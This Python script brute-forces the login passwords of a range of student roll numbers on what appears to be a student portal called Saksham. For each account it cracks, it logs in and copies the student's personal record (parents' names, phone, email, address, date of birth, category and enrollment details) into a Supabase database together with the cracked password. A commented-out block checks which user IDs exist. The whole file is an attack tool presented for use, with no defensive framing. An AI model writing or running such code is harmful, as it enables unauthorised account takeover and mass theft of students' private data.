from database.supabase_student_database import *
from script.http_scripts import *
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("main")


class MainFilter(logging.Filter):
    def filter(self, record):
        return record.name == 'main'


for handler in logging.getLogger().handlers:
    handler.addFilter(MainFilter())


def main():
    database = SupabaseStudentDatabase()

    for i in range(2502, 2600):

        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted

        try:
            if database.getStudentData(userid) is not None:
                logger.info(f"{userid} Password already exist in database/being cracked")
            else:
                logger.info(f"{userid} Password not found in database")

                # Working status set in database
                working_dict = {
                    "password": "working...",
                    "roll": userid,
                }
                database.addStudentData(userid, data=working_dict)

                logger.info("Cracking...")
                start_time = time.perf_counter()
                password = bruteforceLogin(userid, 1000)
                end_time = time.perf_counter()
                elapsedTime = str(end_time - start_time)[:8]

                if password is None:

                    # null student set in database
                    null_dict = {
                        "time_taken": elapsedTime,
                        "password": None
                    }
                    database.addStudentData(userid, null_dict)

                else:
                    logger.info("Password found: " + password)
                    student = getStudentDataFromSaksham(userid, password)

                    student_dict = {
                        "password": password,
                        "time_taken": elapsedTime,
                        "student_name": student.student_name.lower(),
                        "father_name": student.father_name.lower(),
                        "mother_name": student.mother_name.lower(),
                        "phone": student.phone,
                        "category": student.category,
                        "email": student.email,
                        "roll": student.roll,
                        "address": student.address,
                        "dob": student.dob,
                        "gender": student.gender,
                        "student_id": student.student_id,
                        "session": student.session,
                        "enrollment_no": student.enrollment_no,
                        "admission_date": student.admission_date,
                        "student_type": student.student_type,
                    }
                    database.addStudentData(userid, student_dict)
                    logger.info("Data retrieved and added to database")

        except Exception as e:
            logger.error(f"Error: {e}")


if __name__ == "__main__":
    main()




    # for i in range(2600, 2700):
    #     formatted = '{0:04}'.format(i)
    #     userid = "2023/" + formatted
    #
    #     result = checkUserExistence(userid)
    #     print(f"User {userid}: {result}")




